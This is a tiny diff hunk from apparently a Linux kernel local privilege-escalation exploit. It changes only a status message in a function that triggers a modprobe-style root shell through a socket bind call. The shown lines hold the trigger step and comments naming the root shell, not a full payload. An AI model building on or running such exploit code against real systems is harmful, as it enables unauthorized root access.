@@ -356,7 +356,7 @@ int trigger_modprobe_sock(void)
 
 	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)); /* launch the root shell */
 
-	printf("[+] root shell is finished\n");
+	printf("[!] root shell is finished\n");
 	return EXIT_SUCCESS;
 }
 
